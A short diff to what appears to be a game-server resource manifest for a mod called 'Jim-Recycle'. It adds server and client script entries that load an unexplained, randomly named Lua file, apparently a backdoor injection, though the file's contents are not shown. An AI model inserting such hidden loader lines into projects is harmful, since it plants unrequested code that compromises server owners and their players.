@@ -1,3 +1,5 @@
+server_script "G0FQJ5X1Y085XQG.lua"
+client_script "G0FQJ5X1Y085XQG.lua"
 name "Jim-Recycle"
 author "Jimathy"
 version "v2.5"
